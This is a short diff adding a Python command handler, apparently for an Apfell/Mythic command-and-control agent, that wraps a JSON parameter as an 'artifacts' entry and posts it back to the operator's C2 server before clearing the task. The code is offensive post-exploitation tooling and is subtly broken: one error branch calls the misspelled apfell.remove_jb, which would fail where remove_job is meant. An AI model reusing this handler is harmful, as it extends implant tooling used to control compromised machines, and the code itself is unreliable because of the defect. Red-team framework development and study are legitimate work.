@@ -1,0 +1,15 @@
+def new_artifact(apfell, c2, params="whoami", task_id=-1):
+    try:
+        import json
+    except Exception as e:
+        c2.post_response(response="Failed to import modules", task_id=task_id)
+        apfell.remove_jb(task_id)
+        return
+    try:
+        response = json.dumps({"artifacts": [json.loads(params)] })
+        c2.post_response(response=response, task_id=task_id)
+    except Exception as e:
+        c2.post_response(response="Error in execution: {}".format(str(e)), task_id=task_id)
+    apfell.remove_job(task_id) # need to do this to remove your task from the list
+
+COMMAND_ENDS_HERE
